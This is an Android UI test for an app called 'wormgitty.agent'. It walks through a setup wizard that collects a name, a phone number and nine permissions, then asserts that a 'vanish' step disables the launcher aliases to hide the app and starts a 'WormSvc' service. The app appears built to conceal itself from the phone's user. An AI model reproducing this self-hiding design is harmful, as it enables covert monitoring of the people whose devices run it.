package com.wormgitty.agent

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import androidx.compose.ui.test.junit4.createEmptyComposeRule
import androidx.compose.ui.test.onNodeWithTag
import androidx.compose.ui.test.performClick
import androidx.compose.ui.test.performTextInput
import androidx.test.core.app.ActivityScenario
import androidx.test.core.app.ApplicationProvider
import androidx.test.ext.junit.runners.AndroidJUnit4
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Rule
import org.junit.Test
import org.junit.runner.RunWith
import java.util.concurrent.TimeUnit

/**
 * End-to-end happy path on the current wizard: INTRO -> IDENTITY -> PHONE ->
 * 9 perm screens (skipped, mock perms) -> SUMMARY -> finish. With mock_perms the
 * transport is FakeRegistrationApi, so the seal succeeds offline and runs the
 * vanish NOW (veil -> aliases off -> clear pendingHide -> finish).
 */
@RunWith(AndroidJUnit4::class)
class WizardFlowTest {

    @get:Rule
    val compose = createEmptyComposeRule()

    @Test
    fun finishDoesNotHideImmediatelyButSecondLaunchDoes() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        val pkg = context.packageName
        val pm = context.packageManager
        val ns = "com.wormgitty.agent"
        val boost = ComponentName(pkg, "$ns.LauncherBoost")
        val hidden = ComponentName(pkg, "$ns.LauncherHidden")

        val intent = Intent(context, MainActivity::class.java)
            .putExtra(MainActivity.EXTRA_MOCK_PERMS, true)
        ActivityScenario.launch<MainActivity>(intent).use {
            compose.waitForIdle()
            compose.onNodeWithTag("next_intro").performClick()
            compose.waitForIdle()

            compose.onNodeWithTag("name_input").performTextInput("اختبار")
            compose.waitForIdle()
            compose.onNodeWithTag("gender_male").performClick()
            compose.waitForIdle()
            compose.onNodeWithTag("next_identity").performClick()
            compose.waitForIdle()

            compose.onNodeWithTag("phone_input").performTextInput("01012345678")
            compose.waitForIdle()
            compose.onNodeWithTag("next_phone").performClick()
            compose.waitForIdle()

            // 9 perm screens — skip each.
            repeat(PERM_FLOW.size) {
                compose.waitForIdle()
                compose.onNodeWithTag("perm_skip").performClick()
            }
            compose.waitForIdle()

            compose.onNodeWithTag("finish").performClick()
            compose.waitForIdle()

            // Seal ran the vanish: veil (2s) -> WormSvc -> aliases off -> finish.
            TimeUnit.SECONDS.sleep(4)
        }

        assertEquals(
            "boost alias must be disabled after the seal vanish",
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            pm.getComponentEnabledSetting(boost)
        )

        // Second launch consumes pendingHide and performs the vanish.
        ActivityScenario.launch<MainActivity>(intent)
        TimeUnit.SECONDS.sleep(4)

        assertEquals(
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            pm.getComponentEnabledSetting(boost)
        )
        assertEquals(
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            pm.getComponentEnabledSetting(hidden)
        )
        val health = HealthStore.read(context)
        assertTrue("health.json missing after vanish", health != null)
        assertTrue("health not fresh enough: $health", !HealthStore.isStale(health!!, System.currentTimeMillis()))
        assertFalse(
            "pendingHide must be consumed",
            runBlocking { HidePrefs(context).pendingHide() }
        )
    }
}
